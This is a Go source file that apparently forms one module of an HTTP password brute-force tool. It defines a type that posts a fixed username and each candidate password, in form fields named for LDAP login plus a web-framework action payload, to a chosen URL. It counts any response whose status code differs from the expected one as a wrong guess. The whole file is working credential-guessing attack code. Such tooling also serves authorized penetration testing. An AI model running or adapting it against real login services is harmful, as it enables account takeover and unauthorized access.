package main

import (
	"fmt"
	"net/http"
	"strings"
)

type NetHttpBruteImpl struct {
	method             string
	url                string
	username           string
	expectedStatusCode int
	headers            map[string]string
}

func NewHttpBruteImpl(method, url, username string, expectedStatusCode int, headers map[string]string) *NetHttpBruteImpl {
	return &NetHttpBruteImpl{
		method:             strings.ToUpper(method),
		url:                url,
		username:           username,
		expectedStatusCode: expectedStatusCode,
		headers:            headers,
	}
}

func (c *NetHttpBruteImpl) Do(password string) error {
	payload := fmt.Sprintf(`1_ldap-username=%s&1_ldap-secret=%s&0=[{},"$K1"]`, c.username, password)
	req, err := http.NewRequest(c.method, c.url, strings.NewReader(payload))
	if err != nil {
		return err
	}

	for k, v := range c.headers {
		req.Header.Set(k, v)
	}

	// Do not follow redirects
	client := http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != c.expectedStatusCode {
		return NewPasswordErrorWithCode(fmt.Errorf("invalid password: %s", password), resp.StatusCode)
	}
	return nil
}
